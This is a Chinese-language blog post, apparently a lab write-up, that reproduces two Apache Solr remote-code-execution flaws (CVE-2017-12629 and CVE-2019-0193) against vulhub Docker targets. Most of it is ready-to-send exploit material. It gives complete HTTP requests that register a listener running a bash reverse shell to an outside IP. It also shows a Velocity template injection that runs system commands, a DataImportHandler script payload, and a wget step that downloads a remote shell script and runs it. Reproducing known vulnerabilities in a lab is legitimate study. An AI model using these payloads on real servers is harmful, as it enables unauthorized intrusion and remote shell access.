---
title: "Apache Solr RCE漏洞复现"
slug: apache-solr-rcelou-dong-fu-xian
cover: ""
date: 2026-01-09
categories:
  - 漏洞复现
halo:
  site: http://www.hzhsec.top
  name: c43d0179-cb7e-44c7-979d-13a34660e96b
  publish: true
---

---

# 漏洞描述

 `Apache Solr`是什么?
 
**Apache Solr** 是一个基于 **Lucene** 的开源搜索平台，专门用于构建`搜索`应用程序。它由 **Java** 开发，提供了比 Lucene 更丰富的查询语言，并且实现了可配置、可扩展的功能，对索引和搜索性能进行了优化。

**核心功能**
`Solr `可以独立运行在 **Jetty**、**Tomcat** 等 Servlet 容器中。其索引的实现方法非常简单，只需用 **POST** 方法向 Solr 服务器发送一个描述字段及其内容的 `XML `文档，Solr 根据 XML 文档添加、删除、更新索引。搜索时，只需发送 `HTTP GET` 请求，然后对 Solr 返回的 **XML**、**JSON** 等格式的查询结果进行解析，组织页面布局。


## 1.CVE-2017-12629

**漏洞原因**:
Apache Solr 是Apache开发的一个开源的基于Lucene的全文搜索服务器。其集合的配置方法（`config`路径）可以增加和修改监听器，通过`RunExecutableListener`执行任意系统命令。

**影响版本**
Apache Solr < 7.1 
Apache Lucene < 7.1

**漏洞复现**:

漏洞复现环境
准备好`docker`
1. **靶机环境**（使用 vulhub靶场）：
```bash
克隆vulhub仓库
git clone --depth 1 https://github.com/vulhub/vulhub.git
到漏洞地址
cd vulhub/solr/CVE-2017-12629-RCE
```
拉取镜像
```sh
docker-compose up -d 
```
拉取失败的可以使用这个仓库的镜像源配置工具:
```sh
git clone https://github.com/hzhsec/docker_proxy.git
chmod +x *.sh
./docker-proxy.sh
```
再拉取
```sh
docker-compose up -d 
```
使用docker ps查看镜像是否运行

访问：http://靶机IP:8983
1. 检测是否可利用
core是否有数据,版本是否符合
![[Pasted image 20260101154023.png]]
`core selector`有数据,版本为`7.0.1`<7.1

2. 发送数据包
```http
POST /solr/demo/config HTTP/1.1
Host: 192.168.178.141:8983
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 186

{"add-listener":{"event":"postCommit","name":"newliwsten","class":"solr.RunExecutableListener","exe":"bash","dir":"/bin/","args":["-c", "bash -i >& /dev/tcp/10.22.167.164/4444 0>&1"]}}
```

![[Pasted image 20260101155101.png]]
`监听`添加上了
![[Pasted image 20260101155027.png]]

3. 触发监听,执行反弹命令
```http
POST /solr/demo/update HTTP/1.1
Host: 192.168.178.141:8983
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/json
Upgrade-Insecure-Requests: 1
Content-Length: 15

[{"id":"test"}]
```
![[Pasted image 20260101155625.png]]
`成功`反弹:
![[Pasted image 20260101155639.png]]

## 2.CVE-2019-0193

### 漏洞原理

当攻击者可以直接访问Solr控制台时，可以通过发送类似`/节点名/config`的`POST`请求对该节点的配置文件做更改
Apache Solr默认集成`VelocityResponseWriter`插件，在该插件的初始化参数中的`params.resource.loader.enabled`这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模板，默认设置是`false`。
当设置`params.resource.loader.enabled`为`ture`时，将允许用户通过设置请求中的参数来指定相关资源加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。

### 影响版本

Apache Solr 5.x - 8.2.0，存在config API版本

### 漏洞复现

环境也是`vulhub`里面的
```sh
到漏洞镜像地址
cd vulhub/solr/CVE-2019-0193
docker-compose up -d
```

1. 查看是否满足利用条件
应用开启了某个`core`,在`core admin`查看
![[Pasted image 20260101162551.png]]
2. `VelocityResponseWriter插件`默认的`params.resource.loader.enabled`是`false`需要通过`post`修改设置为`true`
```http
POST /solr/demo/config HTTP/1.1
Host: 192.168.178.141:8983
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
```
![[Pasted image 20260101162901.png]]

2. 发送命令执行
```http
GET /solr/demo/select?wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
Host: 192.168.178.141:8983
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```
![[Pasted image 20260101163105.png]]

**DataImportHandler**模块利用

此次漏洞出现在 Apache Solr 的 DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的 DIH 配置都可以通过外部请求的 dataConfig 参数来设置。由于 DIH 配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。

首先在页面左侧选择 `demo` 核心，打开 Dataimport 面板，开启右侧 Debug mode，填入以下 POC：

```html
<dataConfig>
  <script><![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("touch /tmp/success");
          }
  ]]></script>
  <document>
    <entity name="sample"
            fileName=".*"
            baseDir="/"
            processor="FileListEntityProcessor"
            recursive="false"
            transformer="script:poc" />
  </document>
</dataConfig>
```


![[Pasted image 20260101173157.png]]
点击 "Execute with this Configuration" 会发送以下请求：

```http
POST /solr/demo/dataimport?_=1708782956647&indent=on&wt=json HTTP/1.1
Host: your-ip:8983
Content-Length: 613
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Content-type: application/x-www-form-urlencoded
Origin: http://your-ip:8983
Referer: http://your-ip:8983/solr/
Accept-Encoding: gzip, deflate, br
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7
Connection: close

command=full-import&verbose=false&clean=false&commit=true&debug=true&core=demo&dataConfig=%3CdataConfig%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22sample%22%0A++++++++++++fileName%3D%22.*%22%0A++++++++++++baseDir%3D%22%2F%22%0A++++++++++++processor%3D%22FileListEntityProcessor%22%0A++++++++++++recursive%3D%22false%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport

```

进入docker查看是否有文件产生
```sh
docker exec -it id /bin/bash
ls /tmp/success
```
![[Pasted image 20260101173318.png]]

尝试`rce`反弹shell,可能是编码问题,一直执行不了直接反弹命令
发现`wget`有反应,使用`wget`下载带有反弹命令的sh脚本
执行
```sh
wget http://xxx/1.sh
chmod +x 1.sh
bash 1.sh
```

成功反弹
![[Pasted image 20260101173558.png]]

**免责声明**

本文档所包含的漏洞复现方法、技术细节及利用代码，**仅限用于授权的安全测试、教育学习与研究目的**。
**严禁**在未获得明确授权的情况下，对任何系统进行测试或攻击。任何不当使用所导致的法律责任及后果，均由使用者自行承担。
作者与文档提供者不承担任何因滥用本文档信息而产生的直接或间接责任。请遵守您所在地的法律法规，并始终践行负责任的网络安全实践。